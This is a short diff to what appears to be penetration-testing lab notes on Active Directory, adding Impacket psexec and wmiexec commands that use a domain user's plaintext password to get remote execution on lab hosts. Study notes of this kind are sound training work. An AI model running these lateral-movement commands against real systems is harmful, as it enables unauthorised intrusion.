@@ -535,6 +535,17 @@ enumdomusers
 <img width="541" height="746" alt="image" src="https://github.com/user-attachments/assets/8b554b98-5d42-4906-ad2b-f020d968df7c" />
 
 - Impacket-toolkit-:
+- `Psexec.py`-:
+
+```bash
+impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+```
+
+- `wmiexec.py`-:
+
+```bash
+impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5
+```
 
 
 
